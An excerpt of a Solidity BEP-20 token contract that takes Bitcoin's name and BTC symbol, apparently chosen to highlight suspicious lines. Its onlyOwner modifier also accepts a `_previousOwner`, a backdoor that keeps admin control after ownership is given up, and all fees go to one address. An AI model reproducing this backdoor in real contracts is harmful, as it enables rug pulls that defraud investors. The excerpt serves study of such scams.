...
abstract contract Ownable {
    ...
    modifier onlyOwner() {
        require(owner == msg.sender || _previousOwner == msg.sender); _;
    }
...
contract Bitcoin is IBEP20, Ownable {
    ...
    address WRAPPEDASSET = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Bitcoin"; // To Do
    string constant _symbol = "BTC"; // To Do
    ...
    address public marketingFeeReceiver = 0x2ecD4D0451cbcC727818d84C8bdACD1671706dc8;
    address public devFeeReceiver = 0x2ecD4D0451cbcC727818d84C8bdACD1671706dc8;
    address public buybackFeeReceiver = 0x2ecD4D0451cbcC727818d84C8bdACD1671706dc8;
    ...
    constructor () Ownable(msg.sender) {
        ...
        pair = IDEXFactory(router.factory()).createPair(WRAPPEDASSET, address(this));
